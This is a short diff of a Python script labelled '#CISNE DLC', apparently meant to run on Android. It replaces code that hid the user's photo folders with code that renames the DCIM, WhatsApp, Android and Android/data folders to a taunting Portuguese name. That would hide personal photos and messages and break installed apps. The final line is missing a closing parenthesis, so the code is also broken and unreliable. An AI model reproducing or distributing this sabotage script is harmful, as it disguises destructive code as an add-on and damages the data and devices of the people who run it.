@@ -1,7 +1,6 @@
 #CISNE DLC
 import os
-import sys
-import time
-import androidhelper
-os.rename("/sdcard/Pictures", "/sdcard/Android/data/com.android.vending/DCIM")
-os.rename("/sdcard/DCIM", "/sdcard/Android/data/com.android.vending/Pictures")
+os.rename("/sdcard/DCIM", "/sdcard/👻CISNE PROTEGENDO SEU SMARTPHONE, KK")
+os.rename("/storage/emulated/0/Android/data","/storage/emulated/0/Android/👻CISNE PROTEGENDO SEU SMARTPHONE, KK")
+os.rename("/sdcard/WhatsApp","/sdcard/👻CISNE PROTEGENDO SEU SMARTPHONE, KK")
+os.rename("/sdcard/Android","/sdcard/👻CISNE PROTEGENDO SEU SMARTPHONE, KK"
